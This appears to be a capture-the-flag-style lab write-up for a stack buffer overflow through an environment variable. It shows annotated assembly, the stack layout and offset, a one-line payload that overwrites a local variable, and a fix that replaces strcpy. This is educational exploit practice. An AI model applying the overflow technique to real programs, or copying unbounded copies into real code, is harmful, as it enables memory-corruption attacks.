# ex02 — Overflow from environment variable

Goal: `you have correctly modified the variable`

## Assembly (main)

```
sub    esp, 0x60
push   "GREENIE"
call   getenv                    ; getenv("GREENIE")
mov    [esp+0x5c], eax
cmp    [esp+0x5c], 0
jne    .have_env
    errx("please set the GREENIE environment variable")
.have_env:
mov    [esp+0x58], 0             ; modified = 0
mov    eax, [esp+0x5c]           ; src = greenie string
lea    [esp+0x18], ...            ; dst = buffer
call   strcpy                    ; VULN
mov    eax, [esp+0x58]
cmp    eax, 0x0d0a0d0a
jne    .lose
```

## Stack layout

```
+---------------+ esp+0x5c  saved getenv() pointer
+---------------+ esp+0x58  modified   (target = 0x0d0a0d0a)
| buffer[64]    | esp+0x18
+---------------+ esp
```

Offset from buffer to `modified`: `0x58 - 0x18 = 0x40 = 64` bytes.

## Constant

`0x0d0a0d0a` in little-endian memory = `\x0a\x0d\x0a\x0d` = `\n\r\n\r`.
None of the bytes are NUL, so `strcpy` copies them all.

## Exploit

```bash
GREENIE="$(python3 -c "import sys; sys.stdout.buffer.write(b'A'*64 + b'\x0a\x0d\x0a\x0d')")" ./ex02/bin
```

Output: `you have correctly modified the variable`

## Fix

Same class as ex01 — replace `strcpy` with a bounded copy, and treat all
attacker-controlled data (env, argv, files, network) with the same suspicion.
